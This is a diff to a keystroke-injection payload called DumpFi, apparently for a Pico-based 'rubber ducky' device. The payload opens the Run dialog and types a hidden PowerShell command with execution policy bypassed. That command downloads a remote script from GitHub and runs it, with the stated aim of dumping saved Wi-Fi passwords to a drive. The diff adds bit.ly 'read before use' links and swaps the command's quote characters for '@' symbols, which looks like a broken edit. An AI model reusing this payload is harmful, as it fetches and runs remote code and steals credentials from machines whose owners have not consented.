@@ -1,8 +1,13 @@
 #T> DumpFi
-#D> Dump wifi passwords into the D:\ drive
+#D> Dump wifi passwords into the D:\ drive. READ https://bit.ly/pipom_ag BEFORE USE
+
+#N> READ https://bit.ly/pipom_ag BEFORE USE
+
+#R> READ https://bit.ly/pipom_ag BEFORE USE
+#R> A storage device in D:\ (can be PiPo CIRCUITPY by bridging the two pins - see image: https://stuffzez.github.io/PiPo-Ducky/image.png)
 
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iwr -useb 'https://raw.githubusercontent.com/StuffzEZ/PiPo-Ducky/refs/heads/scripts/potentially-malicious/CLICK-ONCE-YOU-HAVE-READ-THE-FILE-BELOW/ps1/dumpfi.ps1' | iex"
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command @iwr -useb 'https://raw.githubusercontent.com/StuffzEZ/PiPo-Ducky/refs/heads/scripts/potentially-malicious/CLICK-ONCE-YOU-HAVE-READ-THE-FILE-BELOW/ps1/dumpfi.ps1' | iex@
 ENTER
